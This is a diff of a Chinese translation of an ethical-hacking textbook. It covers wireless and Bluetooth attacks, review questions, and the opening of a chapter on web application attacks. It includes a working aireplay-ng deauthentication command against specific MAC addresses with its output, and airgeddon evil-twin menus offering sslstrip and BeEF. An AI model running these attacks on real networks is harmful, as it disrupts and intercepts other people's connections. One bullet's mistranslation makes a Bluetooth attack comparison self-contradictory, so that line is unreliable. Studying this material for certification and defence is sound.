-    如果你尝试进行恶意双胞胎攻击，这些信息可能会有用。不过，你可能还想从数据包捕获中获取其他信息。你可以直接写出数据包捕获内容。下面的列表展示了如何使用 `tcpdump` 写出数据包捕获。由于我们使用的是监听接口，仍然能够获取所有的无线电信息。
-
-**Writing a Capture from a Monitor Interface**
-
-```
 ```
 root@quiche:~# tcpdump -w radio.pcap -i wlan0mon
- tcpdump: listening on wlan0mon, link-type IEEE802_11_RADIO (802.11 plus radiotap header), capture size 262144 bytes
- ^C125 packets captured
- 126 packets received by filter
- 0 packets dropped by kernel
- 
-```
+
+tcpdump: listening on wlan0mon, link-type IEEE802_11_RADIO (802.11 plus radiotap header), capture size 262144 bytes
+
+^C125 packets captured
+
+126 packets received by filter
+
+0 packets dropped by kernel
 ```
 
-一旦你保存了数据包捕获，就可以在像 Wireshark 这样的程序中打开它。Figure 11.8 显示了前面提到的同一个探测请求的更详细内容。这里你不仅可以看到 SSID，还能看到设备请求的某些功能。你还会看到设备请求的信道以及设备的厂商 ID。这正是让人确信这是车库门开启器的原因。发送设备的厂商 ID 为 **Chamberlain Group**，即拥有 LiftMaster 车库门开启器的公司。你还会看到探测请求中包含 Broadcom 厂商特定信息。Broadcom 是一种常见的无线芯片制造商，这表明该无线设备预期了解 Broadcom 的功能，并希望使用其中的某些功能。
+一旦你保存了数据包捕获，就可以在像 Wireshark 这样的程序中打开它。Figure 11.8 显示了前面提到的同一个探测请求的更详细内容。这里你不仅可以看到 SSID，还能看到设备请求的某些功能。你还会看到设备请求的信道以及设备的厂商 ID。这正是让人确信这是车库门开启器的原因。发送设备的厂商 ID 为 `Chamberlain Group`，即拥有 LiftMaster 车库门开启器的公司。你还会看到探测请求中包含 Broadcom 厂商特定信息。Broadcom 是一种常见的无线芯片制造商，这表明该无线设备预期了解 Broadcom 的功能，并希望使用其中的某些功能。
 
 ![FIGURE 11.8 Probe request in Wireshark](img/c11f008.png)
 
@@ -10019,35 +10999,43 @@ Wireshark 还能提供关于无线连接的额外信息，这些信息在 `tcpdu
 
 无线电头和其他无线数据包可以提供我们一些信息。其中一个挑战是，除非你知道想要窃听的无线网络的信道，否则你会漏掉数据。如果你只是想普遍收集数据，可以尝试频率或信道跳转，前提是你的网卡驱动支持此功能。进行信道跳转时，你会在每个新信道上监听，从而漏掉其他所有信道上的数据。这同样是无线网卡的局限性，正如其他无线电一样。你只能在单一频率上调谐。这意味着在进行实际捕获前，最好先进行一些扫描，以确定你真正关心的网络所在的信道。
 
-#### Deauthentication Attack
+## Deauthentication Attack
 
 Deauthentication 攻击发送消息，迫使设备重新与接入点进行身份验证，实际上会将设备踢出网络，使其重新建立关联。这也是使用 `aircrack` 套件工具的另一个场景。本例中，我们将使用 `aireplay-ng`。正如所述，接口必须处于正确的信道，以便知道发送消息的频率。在 Linux 下，这通过 `iwconfig` 程序实现；在 Windows 下，则通过无线网卡的属性进行设置。下面的代码示例展示了如何设置正确的信道并运行 deauthentication 攻击，你会看到发送了 10 条 deauthentication 消息。
 
-**Deauthentication Attack**
+## Deauthentication Attack
 
 ```
-```
 root@quiche:~# sudo iwconfig wlan0mon channel 6
- root@quiche:~# aireplay-ng -0 10 -a C4:EA:1D:D3:78:39 -c 64:52:99:50:48:94 wlan0mon
- 18:22:59  Waiting for beacon frame (BSSID: C4:EA:1D:D3:78:39) on channel 6
- 18:23:00  Sending 64 directed DeAuth (code 7). STMAC: [64:52:99:50:48:94] [ 0|62 ACKs]
- 18:23:00  Sending 64 directed DeAuth (code 7). STMAC: [64:52:99:50:48:94] [ 0|60 ACKs]
- 18:23:01  Sending 64 directed DeAuth (code 7). STMAC: [64:52:99:50:48:94] [ 0|34 ACKs]
- 18:23:01  Sending 64 directed DeAuth (code 7). STMAC: [64:52:99:50:48:94] [ 0|32 ACKs]
- 18:23:02  Sending 64 directed DeAuth (code 7). STMAC: [64:52:99:50:48:94] [ 0|61 ACKs]
- 18:23:02  Sending 64 directed DeAuth (code 7). STMAC: [64:52:99:50:48:94] [ 0|57 ACKs]
- 18:23:03  Sending 64 directed DeAuth (code 7). STMAC: [64:52:99:50:48:94] [ 0|59 ACKs]
- 18:23:03  Sending 64 directed DeAuth (code 7). STMAC: [64:52:99:50:48:94] [ 1|56 ACKs]
- 18:23:04  Sending 64 directed DeAuth (code 7). STMAC: [64:52:99:50:48:94] [ 0|55 ACKs]
- 18:23:05  Sending 64 directed DeAuth (code 7). STMAC: [64:52:99:50:48:94] [ 0|43 ACKs]
- 
-```
+
+root@quiche:~# aireplay-ng -0 10 -a C4:EA:1D:D3:78:39 -c 64:52:99:50:48:94 wlan0mon
+
+18:22:59  Waiting for beacon frame (BSSID: C4:EA:1D:D3:78:39) on channel 6
+
+18:23:00  Sending 64 directed DeAuth (code 7). STMAC: [64:52:99:50:48:94] [ 0|62 ACKs]
+
+18:23:00  Sending 64 directed DeAuth (code 7). STMAC: [64:52:99:50:48:94] [ 0|60 ACKs]
+
+18:23:01  Sending 64 directed DeAuth (code 7). STMAC: [64:52:99:50:48:94] [ 0|34 ACKs]
+
+18:23:01  Sending 64 directed DeAuth (code 7). STMAC: [64:52:99:50:48:94] [ 0|32 ACKs]
+
+18:23:02  Sending 64 directed DeAuth (code 7). STMAC: [64:52:99:50:48:94] [ 0|61 ACKs]
+
+18:23:02  Sending 64 directed DeAuth (code 7). STMAC: [64:52:99:50:48:94] [ 0|57 ACKs]
+
+18:23:03  Sending 64 directed DeAuth (code 7). STMAC: [64:52:99:50:48:94] [ 0|59 ACKs]
+
+18:23:03  Sending 64 directed DeAuth (code 7). STMAC: [64:52:99:50:48:94] [ 1|56 ACKs]
+
+18:23:04  Sending 64 directed DeAuth (code 7). STMAC: [64:52:99:50:48:94] [ 0|55 ACKs]
+
+18:23:05  Sending 64 directed DeAuth (code 7). STMAC: [64:52:99:50:48:94] [ 0|43 ACKs]
 ```
 
 执行此攻击需要你拥有接入点的 BSSID，即用于帧头的设备 MAC 地址。你还需要目标设备的 MAC 地址，即你想要发起 deauthentication 攻击的设备。你也可以通过省略 `‑c` 参数来对所有站点进行 deauthentication，从而跳过客户端 MAC 地址。为了获取更多运行此攻击的细节，你可以使用 `airodump-ng`，这是 `aircrack-ng` 套件中的另一个程序。下面的列表展示了 `airodump-ng` 的输出示例。你会看到系统在范围内的所有 BSSID，以及功率水平、 beacon 数量、信道号等信息。列表底部会显示站点及其关联的 SSID。
 
-**Using airodump-ng to Acquire Information**
-
+## Using airodump-ng to Acquire Information
 
 
 
@@ -10096,7 +11084,7 @@ CH  6 ][ Elapsed: 6 mins ][ 2018-12-16 18:22
 
 另一个原因是捕获关联过程中的握手。在 WEP 中，此流量可用于提取加密密钥。这意味着如果你同时捕获了所有加密流量，就可以对其进行解密。这是因为初始化向量（IV）的计算存在弱点——IV 是用于种子密钥的随机数，但它并非真正随机，因而可被识别。这在 WPA2 中不存在。WEP 的弱点不适用于 WPA2。这并不表示 WPA2 没有其他攻击方式。
 
-#### 恶意双子
+### 恶意双子
 
 恶意双子是一种伪装成合法接入点的恶意接入点，即它广播已知的 SSID。你可能认为这很容易实现。你只需设置一个接入点并让设备关联到它即可。这可能并不能帮助你太多。你可以让系统连接到你控制的网络，希望能 compromising 它们。你也可以捕获未加密的网页流量，其中可能包含用户名和密码。不过，更好的做法是从设备上收集信息，例如认证信息或所需的 PSK，这将使你能够访问企业网络。获取这些信息需要的不仅仅是一个接入点。
 
@@ -10104,7 +11092,7 @@ CH  6 ][ Elapsed: 6 mins ][ 2018-12-16 18:22
 
 另一个可用的工具是 `airgeddon`。这是一个在 Linux 发行版上运行的程序，可用于多种无线攻击。下面的代码片段展示了程序启动后的初始菜单，它会先检查系统兼容性以及所有所需工具和库的存在情况。许多攻击需要将接口放入监听模式，`airgeddon` 可以完成此操作。与在攻击过程中手动将接口切换到监听模式不同，它提供了一个菜单选项。你也会看到有一个“握手工具”菜单选项，这里可以捕获关联时产生的握手。
 
-**airgeddon 攻击菜单**
+#### airgeddon 攻击菜单
 
 ```
  Interface wlan0 selected. Mode: Managed. Supported bands: 2.4Ghz
@@ -10131,34 +11119,49 @@ CH  6 ][ Elapsed: 6 mins ][ 2018-12-16 18:22
 
 我们之前在谈论恶意双子攻击。这也是一个菜单选项。选择“恶意双子攻击菜单”后，你会看到另一组菜单选项。同样，你可以将接口放入监听模式。你还可以选择不同类型的恶意双子攻击。单纯创建一个恶意双子接入点是个起步，但如果你使用该攻击，还需要其他工具来捕获数据。让 `airgeddon` 为你完成完整攻击是最简便的。你可以看到除了恶意双子之外，还可以启用嗅 sniffing（抓包）和 `sslstrip`。使用 `sslstrip` 可以帮助潜在地解密网页流量。如果攻击成功，你将获得纯文本的网页流量。你也可以使用 `bettercap` 在仅捕获无线流量的基础上进行欺骗攻击。这也可以让你利用浏览器利用框架（BeEF）来利用浏览器漏洞，从而通过他人的浏览器 compromising 系统。
 
-**恶意双子攻击菜单**
+#### 恶意双子攻击菜单
 
-
-
-
-# **************************** 恶意双胞胎攻击菜单
-# ****************************
+```
 Interface `wlan0` 已选中。模式：Managed。支持的频段：2.4Ghz
+
 已选 BSSID：None
+
 已选信道：None
+
 已选 ESSID：None
 
 从菜单中选择一个选项：
+
 ---------
+
 0.  返回主菜单
+
 1.  选择另一个网络接口
+
 2.  将接口设置为监听模式
+
 3.  将接口设置为受控模式
+
 4.  探测目标（需要监听模式）
+
 ---------------（不抓包，仅 AP）----------------
+
 5.  恶意双胞胎攻击仅 AP
+
 ---------------------（带抓包）---------------------
+
 6.  恶意双胞胎 AP 攻击带抓包
+
 7.  恶意双胞胎 AP 攻击带抓包和 sslstrip
+
 8.  恶意双胞胎 AP 攻击带抓包和 bettercap-sslstrip2/BeEF
+
 ------------（不抓包， captive portal）------------
+
 9.  恶意双胞胎 AP 攻击 captive portal（需要监听模式）
+
 ---------
+```
 
 `airgeddon` 需要两个无线接口才能执行恶意双胞胎攻击。它需要第二个接口用于 DoS 追踪模式，以防止频率跳变这一可能的防护。第二个接口还用于对合法接入点进行拒绝服务攻击，从而使其无法响应站点而响应伪装接入点。
 
@@ -10172,7 +11175,7 @@ Interface `wlan0` 已选中。模式：Managed。支持的频段：2.4Ghz
 
 如果 nonce 值的传输可以被重放，则任何密钥创建都面临攻击。这不仅影响站点与接入点之间的会话密钥，也影响组密钥。这会导致无线网络的组播和广播传输暴露。无论是 WPA 还是 WPA2、企业版还是个人版的现代无线网络，都可能受到此类攻击的影响。截至本文撰写时，仍有不多的工具能够自动化利用此 Key Reinstallation Attack（KRACK）。不过，针对网络组件的修复已经可用，这应该不再是大问题。
 
-## Using *mdk3/4*
+## Using `mdk3/4`
 
 存在多种用于无线攻击的工具。其中 `mdk3/4` 可以用于多种攻击类型。它可以进行 beacon flooding、认证拒绝服务攻击、deauthentication 攻击以及其他测试。该工具可在 Kali Linux 和 ParrotOS 上安装，两个版本在两个操作系统中均有提供。要开始使用，需要在无线接口上开启监听模式。可以使用 `airmon-ng`（来自 Aircrack 工具包）来实现。下面是用于在通道 1 上开启监听模式的命令，针对接口 `wlan0`：
 
@@ -10211,12 +11214,11 @@ Packets sent:    128 - Speed:  127 packets/sec
 
 Bluetooth 通过 profile 来描述其功能。每个 Bluetooth 设备会实现一组或多个 profile，具体取决于设备的需求。例如，蓝牙耳机会实现 Advanced Audio Distribution（A2DP）profile，该 profile 定义了如何在两台设备之间流式传输多媒体音频。耳机可能还会实现其他 profile，因此每个 Bluetooth 设备可能实现多个 profile。当两台设备配对时，它们会共享能力，即告诉对方它们支持哪些 profile。
 
-
-
-
 扫描过程会在两个设备之间建立连接。扫描需要验证，因此每个设备都应提供一种表示它希望与另一设备配对的方式。早期设备使用了简单的四位数字（PIN），需要提供该数字以表明请求配对的设备知道该值。输入能力有限的设备（如头戴式耳机或耳机）会使用硬编码值。设备文档会为您提供正确的值。随后的蓝牙版本扩展了用于验证配对请求的功能。
 
 蓝牙 v2.1 引入了 Simple Secure Pairing（SSP），该版本提供了四种在不考虑对旧设备的兼容性的前提下完成配对请求的机制。第一种称为 Just Works，配对本应在用户无需进行任何交互的情况下自动完成。如果双方都有输入能力，则可以支持数值比较。在此情况下，每一端会显示一个六位数字值。如果两个值相同，用户可以确认此情况，两端即可完成配对过程。
+
+
 
 在某些情况下，外设可能只能提供输入但无法输出，例如蓝牙键盘。当您将其与计算机配对时，计算机可能会提示您在键盘上输入一个值。如果数值匹配，配对过程即完成。这通常是一个六位数字值。最后，您还可以进行带外配对。这需要另一个协议协助配对过程。例如，近场通信（NFC）有时会被使用。您可能拥有一个设备，要求您将另一设备（如智能手机或平板）靠近。两设备靠近后，可在智能手机或平板上的应用程序中使用该功能完成配对和设置过程。
 
@@ -10261,12 +11263,9 @@ Bluetooth 通过 profile 来描述其功能。每个 Bluetooth 设备会实现�
 |2023/03/02 18:39:47 | A8:51:AB:9C:66:ED | 0x0000   | 0x000000  | kilroy4KTV | 
 ```
 
-
-
-
 -   [蓝牙劫持]的危险程度远高于蓝牙劫持。蓝牙劫持是向设备发送数据，而蓝牙劫持则是从设备获取数据。蓝牙设备必须在一定程度上暴露，以便其他设备能够开始配对过程。这为另一设备利用这段“小窗口”提供了可能。已有攻击者能够在不经过配对过程的情况下通过蓝牙获取设备的访问。如果攻击者能够获取某人智能手机或其他带有敏感数据的蓝牙设备的访问权限，他们可能会提取这些数据。
 
--   与其他蓝牙攻击类似，攻击者必须在靠近目标设备的范围内。但有一种变体称为`*长距离蓝牙劫持*`，可以在更大的距离上进行相同的攻击。
+-   与其他蓝牙攻击类似，攻击者必须在靠近目标设备的范围内。但有一种变体称为 `长距离蓝牙劫持`，可以在更大的距离上进行相同的攻击。
 
 -   `bluesnarf++`攻击与蓝牙劫持类似，但攻击者获取受害设备文件系统的方式不同。蓝牙劫持通过 OBEX 协议实现。如果在 OBEX 上运行文件传输协议（FTP）服务器，则可以在无需任何身份验证的情况下访问远程系统。这是因为 OBEX 推送服务。
 
@@ -10280,7 +11279,7 @@ Bluetooth 通过 profile 来描述其功能。每个 Bluetooth 设备会实现�
 
 ### Bluedump
 
--   Bluedump 攻击需要攻击者具备一定的知识，但可以使目标系统信任攻击者系统。攻击者必须知道受害设备的`BDADDR`（硬件地址）。攻击者在连接尝试时会伪造该地址。目标设备会发送认证请求。攻击者设备则回复`HCI_Link_Key_Request_Negative_Reply`消息。这可能导致目标设备删除用于认证被伪装设备的现有密钥。随后目标设备进入配对模式，从而允许攻击者与目标设备配对，使攻击者的系统成为受信任设备。
+-   Bluedump 攻击需要攻击者具备一定的知识，但可以使目标系统信任攻击者系统。攻击者必须知道受害设备的 `BDADDR`（硬件地址）。攻击者在连接尝试时会伪造该地址。目标设备会发送认证请求。攻击者设备则回复 `HCI_Link_Key_Request_Negative_Reply` 消息。这可能导致目标设备删除用于认证被伪装设备的现有密钥。随后目标设备进入配对模式，从而允许攻击者与目标设备配对，使攻击者的系统成为受信任设备。
 
 ### Bluesmack
 
@@ -10296,7 +11295,7 @@ Bluetooth 通过 profile 来描述其功能。每个 Bluetooth 设备会实现�
 
 -   对移动设备最令人担忧的威胁渠道之一是通过应用程序。Android 配备 Google Play Store 作为应用市场。Samsung 等厂商也提供自己的应用市场，供用户安装应用。此外，第三方应用商店也可以在设备上配置。默认情况下，Android 平台通常禁止此类设置，但用户若愿意，可以绕过该保护措施。
 
--   Apple 拥有自己的市场。您可以在 Figure 11.10 中看到 Apple App Store。iOS 不是像 Android 那样的开放平台，无法配置额外的市场或在不破坏操作系统的情况下安装应用。此过程通常称为`*越狱*`，随着 Apple（以及 Google 和 Samsung）发现并修复曾被利用的漏洞，越狱已变得不再 trivial。倾向于越狱的用户可能也更倾向于安装非法软件。
+-   Apple 拥有自己的市场。您可以在 Figure 11.10 中看到 Apple App Store。iOS 不是像 Android 那样的开放平台，无法配置额外的市场或在不破坏操作系统的情况下安装应用。此过程通常称为 `越狱`，随着 Apple（以及 Google 和 Samsung）发现并修复曾被利用的漏洞，越狱已变得不再 trivial。倾向于越狱的用户可能也更倾向于安装非法软件。
 
 ### 移动设备攻击
 
@@ -10306,8 +11305,6 @@ Bluetooth 通过 profile 来描述其功能。每个 Bluetooth 设备会实现�
 
 **FIGURE 11.10** Apple App Store
 
-
-
 Many apps regularly collect data, either with the user's awareness or without. This data can be transmitted back to storage controlled by the app's owner. Most applications use frameworks provided by the operating system vendor (e.g., Apple or Google). These frameworks might commonly be used to send data over an HTTP connection, and they may even force encryption of that connection. There is no guarantee of that encryption, though, which means data can be leaked if the application collects data from the user and then sends that data to a remote storage location. This data leakage is potentially a serious problem, and it might also be used by an attacker to gather details that could be used for other attacks.
 
 As mentioned, wireless networks aren't always protected. There may be rogue networks or unencrypted networks. This is another place where data leakage can happen. Using techniques shown earlier in this chapter, data can be collected over wireless networks. This may be especially useful in public places, where people are likely to be attached to wireless networks from their mobile devices. They may also be likely to be doing things like checking enterprise email or interacting over enterprise communications platforms like Microsoft Teams, Slack, or HipChat.
@@ -10315,6 +11312,8 @@ As mentioned, wireless networks aren't always protected. There may be rogue netw
 Some other common attacks against mobile devices are the same as those you would think about for traditional desktop systems. A mobile device may have a different processor, and the operating systems do provide some protections for applications so they don't interact with other applications on the device. This is a technique called `sandboxing`. Phishing attacks are just as possible on mobile devices. Malware is possible on mobile devices, just as it is on desktop systems. Malware can include spyware, collecting information from the mobile device.
 
 Bad programming is always an issue. No matter how much testing is performed, between the software vendor and the platform vendor, bugs happen. In some cases, bad encryption mechanisms may be used. This may happen when programmers think there are better ways to encrypt than by standard means. It's commonly felt that openly available encryption is best because it gets to be analyzed and tested by a lot of people who are the best in their fields.
+
+
 
 Another possibility from bad programming practices is improperly handling session data. Session data is used to provide information about the state of the application communications. It lets the client and server know where they are in the application flow. If session information isn't handled properly, sessions can be impersonated. They may also be replayed. This may be especially possible in combination with weak encryption.
 
@@ -10342,8 +11341,6 @@ WEP was the first attempt at encrypting wireless communications. Unfortunately, 
 
 Wireless networks can be attacked. In networks that use WEP, the encryption key could be derived if enough frames were collected from the wireless network. Common sniffing applications like Wireshark can be used to sniff wireless networks. The wireless interface needs to be put into monitor mode to collect the radio headers. Wireshark may be capable of doing this on its own, depending on the network interface. You can also use the `airmon` program from the `aircrack-ng` suite. You can also use `aircrack-ng` to try to crack the password used for the network.
 
-
-
 一种获取足够数据的方法是使用去认证攻击。该攻击向客户端发送消息，告诉它们在网络上已被注销。攻击系统伪造消息，使其看起来像是来自接入点的。同时，攻击者可能尝试干扰接入点，使其无法获取或响应站点。攻击者可能会持续发送这些注销消息，迫使受害站点不断发送尝试向网络进行认证的消息。
 
 恶意双胞胎攻击是攻击者建立一个看似合法、SSID 相同的网络。站点会尝试向恶意接入点进行认证。恶意接入点随后可以收集任何认证凭据，一旦站点将这些凭据发送过去，恶意双胞胎会允许连接，并在站点连接后收集该站点的流量。
@@ -10361,197 +11358,261 @@ Wireless networks can be attacked. In networks that use WEP, the encryption key 
 1. 无线网络的两种类型是什么？
 
    1. 星形和环形  
+
    2. 巴士和混合  
+
    3. 基础设施和混合  
+
    4. 基础设施和自组织  
 
 2. WPA 握手使用了多少个阶段？
 
    1. 两个  
+
    2. 四个  
+
    3. 三个  
+
    4. 一个  
 
 3. 为了捕获无线流量的所有头部，需要在网络接口上启用哪种模式？
 
    1. 促销模式  
+
    2. 监听模式  
+
    3. 无线电模式  
+
    4. 无线局域网模式  
 
 4. 哪种无线攻击可以利用已知信息来解密无线流量？
 
    1. 窃听  
+
    2. 注销攻击  
+
    3. 重新安装键攻击  
+
    4. 恶意双胞胎  
 
 5. 执行蓝牙扫描的目的是什么？
 
    1. 识别开放端口  
+
    2. 识别可用配置文件  
+
    3. 识别终端  
+
    4. 识别厂商  
 
 6. 执行去认证攻击的目的是什么？
 
    1. 禁用站点  
+
    2. 强制站点重新认证  
+
    3. 减少握手步骤数量  
+
    4. 降低加密强度  
 
 7. 允许个人在企业网络中使用自己智能手机的政策是什么？
 
    1. 自带设备  
+
    2. 使用个人设备  
+
    3. 自带智能设备  
+
    4. 使用个人智能设备  
 
 8. WEP 中加密过程的哪个部分较弱？
 
    1. 密钥  
+
    2. Diffie‑Hellman  
+
    3. 初始化向量  
+
    4. 种子向量  
 
 9. WPA 四向握手的用途是什么？
 
    1. 传递密钥  
+
    2. 派生密钥  
+
    3. 加密消息  
+
    4. 初始化种子  
 
 10. SSID 的用途是什么？
 
     1. 加密消息  
+
     2. 提供 IP 地址  
+
     3. 标识网络  
+
     4. 种子密钥  
 
 11. 恶意双胞胎攻击中使用的接入点类型是什么？
 
     1. 基础设施  
+
     2. 自组织  
+
     3. WPA  
+
     4. 恶意  
 
 12. 恶意双胞胎攻击是如何工作的？
 
     1. 钓鱼用户获取凭据  
+
     2. 伪造 SSID  
+
     3. 修改 SSID  
+
     4. 注入四向握手  
 
 13. 如果没有让用户做出他们通常不会做的事，最可能的方法是使用什么来在移动设备上安装恶意软件？
 
     1. 使用 Apple Store 或 Google Play Store  
+
     2. 使用 Android 的外部存储  
+
     3. 使用第三方应用商店  
+
     4. 越狱  
 
 14. Bluebugging 攻击的用途是什么？
 
     1. 识别附近的蓝牙设备  
+
     2. 监听物理空间  
+
     3. 启用手机摄像头  
+
     4. 从目标系统收集数据  
 
 15. Class A 蓝牙设备的信号范围通常是多少？
 
     1. 300 英尺  
+
     2. 3,000 英尺  
+
     3. 75 英尺  
+
     4. 500 英尺  
 
 16. 哪个工具可以用于在无线网络上进行窃听以获取所有头部？
 
     1. Ettercap  
+
     2. `tcpdump`  
+
     3. `aircrack-ng`  
+
     4. `airmon-ng`  
 
 17. 从受害者的角度看，蓝牙骗取（Bluesnarfing）比蓝牙劫持（Bluejacking）更危险的原因是？
 
     1. Bluejacking 发送，Bluesnarfing 接收。  
+
     2. Bluejacking 接收，Bluesnarfing 发送。  
+
     3. Bluejacking 安装键盘记录器。  
+
     4. Bluesnarfing 安装键盘记录器。  
 
 18. 哪个工具可以用于执行恶意双胞胎攻击？
 
     1. Wireshark  
+
     2. Ettercap  
+
     3. `wifiphisher`  
+
     4. `aircrack-ng`  
 
 19. WPA‑加密网络允许的认证类型有哪些？
 
     1. 握手和个人  
+
     2. 个人和企业  
+
     3. 企业和握手  
+
     4. 802.11 和个人  
 
 20. 捕获包含无线电头部的无线流量时，下面哪项通常看不到？
 
     1. 能力  
+
     2. 探测请求  
+
     3. SSID  
+
     4. 网络类型  
 
 21. WPA3 用什么来启动站点与接入点之间的认证和关联过程？
 
     1. 四向握手  
+
     2. 同伴的相互认证  
+
     3. 同等之间的同时认证  
+
     4. 分离的认证与加密  
 
 22. 哪些蓝牙攻击可能导致服务拒绝（DoS）？
 
     1. Bluejacking  
+
     2. Bluesnarfing  
+
     3. Bluedumping  
+
     4. Bluesmack  
+
+
 
 23. 如果你手里有一个 Pringles 罐和一台笔记本电脑，最可能使用的技术是什么？
 
-    1. Bluesnarfing  
-    2. 无线足迹探测  
-    3. 恶意双胞胎  
-    4. 重新安装键  
+1. `Bluesnarfing`
+2. 无线足迹探测
+3. 恶意双胞胎
+4. 重新安装键
 
-24. 要执行 Bluedump 攻击，需要哪些信息？
+24. 要执行 `Bluedump` 攻击，需要哪些信息？
 
-    1. BDADDR  
-    2. BDIP  
-    3. IPADDR  
-    4. DUMPADDR  
+1. `BDADDR`
+2. `BDIP`
+3. `IPADDR`
+4. `DUMPADDR`
 
 25. 为了让无线信号主要在建筑内部传播而不外泄，应选择哪种建筑材料？
 
-    1. 胶合板  
-    2. 玻璃  
-    3. 石膏板  
-    4. 混凝土  
+1. 胶合板
+2. 玻璃
+3. 石膏板
+4. 混凝土
 
-Chapter 12  
-攻击与防御
+## Chapter 12 攻击与防御
 
 攻击是伦理黑客参与的重要元素。在完成对环境的全面评估后，你可以转向尝试获取访问权限。虽然社交工程在攻击中可能发挥重要作用，但它并不是唯一的入口。一旦你进入系统，还需要进行横向移动。这可能需要一些技术性攻击。可能涉及 Web 应用及其暴露的漏洞。你可能还需要了解拒绝服务攻击。在进行伪造攻击时，可能需要关闭服务器。还有聆听服务的应用层 compromises。
 
-
-
-
--   另一个在攻击网络时需要考虑的要素是已有的防护措施。由于伦理黑客的主要目标是提升组织的防御态势，因此了解防御策略是有帮助的。在攻击方面，了解可能存在的防护措施将帮助你绕过防护。当你为所在组织提供修复措施时，应该更好地理解可能采取的措施。
+另一个在攻击网络时需要考虑的要素是已有的防护措施。由于伦理黑客的主要目标是提升组织的防御态势，因此了解防御策略是有帮助的。在攻击方面，了解可能存在的防护措施将帮助你绕过防护。当你为所在组织提供修复措施时，应该更好地理解可能采取的措施。
 
 Web 应用是用户获取业务功能和数据的常见方式。攻击 Web 应用的方法有多种。成功攻击 Web 应用可能导致多种潜在结果，包括获得系统级访问。网站也会受到拒绝服务攻击的攻击。虽然带宽消耗攻击会让人联想到拒绝服务，但它并不是唯一的拒绝服务攻击类型。还有其他方式可以进行拒绝服务攻击，这些方式依然有效且与带宽消耗无关。
 
-攻击者通常会尝试在系统之间移动——我们称之为 `*lateral movement*`。由于这点以及容易通过已有的开放漏洞进入，因此拥有良好的防御策略很重要。虽然 `defense‑in‑depth` 和 `defense‑in‑breadth` 长期被认为是保护网络的良好做法，另一种思考网络设计的方式是实施 `defensible network architecture`。
+攻击者通常会尝试在系统之间移动——我们称之为 `lateral movement`。由于这点以及容易通过已有的开放漏洞进入，因此拥有良好的防御策略很重要。虽然 `defense-in-depth` 和 `defense-in-breadth` 长期被认为是保护网络的良好做法，另一种思考网络设计的方式是实施 `defensible network architecture`。
 
 ## Web Application Attacks
 
 Web 应用不只是一组网页。静态站点也有可能，用户对页面没有程序化交互。页面呈现给用户，可能包含链接和其他内容，但没有可供用户输入或向服务器发送可被处理的内容。Web 应用可能包含页面内的代码，使用脚本语言，或运行在服务器上的代码。
 
-从架构角度思考 Web 应用，一种常见的开发方式是采用模型‑视图‑控制器（MVC）模式。Figure 12.1 展示了 MVC 模式在 Web 应用中的实现示意图。模型是数据结构。虽然它通常存储在数据库中，但往往有一个应用服务器负责管理模型的创建和操作。应用服务器使用数据库服务器进行持久化存储，但所有对数据（模型）的处理均在应用服务器完成。传统上，数据库服务器是关系型数据库，这意味着所有数据操作均发起于应用服务器，虽然业务逻辑有时会在数据库服务器上执行。请记住，使用关系型数据库时与数据库的交互是通过 Structured Query Language（SQL）实现的。虽然业务和应用逻辑在应用服务器中，但有时操作实际上是在数据库服务器上完成。
+从架构角度思考 Web 应用，一种常见的开发方式是采用模型-视图-控制器（MVC）模式。Figure 12.1 展示了 MVC 模式在 Web 应用中的实现示意图。模型是数据结构。虽然它通常存储在数据库中，但往往有一个应用服务器负责管理模型的创建和操作。应用服务器使用数据库服务器进行持久化存储，但所有对数据（模型）的处理均在应用服务器完成。传统上，数据库服务器是关系型数据库，这意味着所有数据操作均发起于应用服务器，虽然业务逻辑有时会在数据库服务器上执行。请记住，使用关系型数据库时与数据库的交互是通过 Structured Query Language（SQL）实现的。虽然业务和应用逻辑在应用服务器中，但有时操作实际上是在数据库服务器上完成。
 
 ![FIGURE 12.1 Model/view/controller design](img/c12f001.png)
 
@@ -10567,33 +11628,25 @@ Web 应用不只是一组网页。静态站点也有可能，用户对页面没�
 
 开放式 Web 应用安全项目（OWASP）是一个项目集合。其中之一是 Top 10 Vulnerabilities 项目，列出了 Web 应用中常见的漏洞。虽然这些漏洞专门针对 Web 应用，但其底层问题在原生应用中也常见。列表会定期更新，当前列表中的大多数漏洞是对已有漏洞的变体，经过名称变更和合并后，许多漏洞已存在多年。2021 版（从 2017 版更新而来）包含以下漏洞：
 
-*   **A01:2021 Broken Access Control** — 包含多种情况，如给予用户过多权限、绕过访问控制检查、提升权限以及强制浏览。
-
-*   **A02:2021 Cryptographic Failures** — 之前称为 Sensitive Data Exposure，这更多是从漏洞中产生的结果而非漏洞本身。该类漏洞包括未使用加密、使用弱密钥、使用不佳的加密机制、使用过时的加密、以及使用验证不当的证书元素。
-
-*   **A03:2021 Injection** — 这是一个类别，曾被细分为多个具体漏洞。后文将提供具体的注入攻击示例，包括 SQL 注入和跨站脚本（XSS）。
-
-*   **A04:2021 Insecure Design** — 设计不佳会导致应用出现安全问题，因为安全在设计阶段未被考虑。更好地理解对应用的威胁将有助于改进设计。
-
-*   **A05:2021 Security Misconfiguration** — 包括操作系统或应用缺乏适当的硬化，也可能是留下默认用户名和密码的情况。
-
-*   **A06:2021 Vulnerable or Outdated Components** — 缺乏补丁导致这些漏洞，且对库或框架的审查不足可能导致选择有漏洞的组件。
-
-*   **A07:2021 Identification and Authentication Failures** — 包括凭证充填或暴力破解等攻击，明文存储密码也属于此类，以及对会话标识值处理不当的问题。
-
-
+*   `A01:2021 Broken Access Control` — 包含多种情况，如给予用户过多权限、绕过访问控制检查、提升权限以及强制浏览。
+*   `A02:2021 Cryptographic Failures` — 之前称为 Sensitive Data Exposure，这更多是从漏洞中产生的结果而非漏洞本身。该类漏洞包括未使用加密、使用弱密钥、使用不佳的加密机制、使用过时的加密、以及使用验证不当的证书元素。
+*   `A03:2021 Injection` — 这是一个类别，曾被细分为多个具体漏洞。后文将提供具体的注入攻击示例，包括 SQL 注入和跨站脚本（XSS）。
+*   `A04:2021 Insecure Design` — 设计不佳会导致应用出现安全问题，因为安全在设计阶段未被考虑。更好地理解对应用的威胁将有助于改进设计。
+*   `A05:2021 Security Misconfiguration` — 包括操作系统或应用缺乏适当的硬化，也可能是留下默认用户名和密码的情况。
+*   `A06:2021 Vulnerable or Outdated Components` — 缺乏补丁导致这些漏洞，且对库或框架的审查不足可能导致选择有漏洞的组件。
+*   `A07:2021 Identification and Authentication Failures` — 包括凭证充填或暴力破解等攻击，明文存储密码也属于此类，以及对会话标识值处理不当的问题。
 
 # A08:2021 软件和数据完整性失败
 
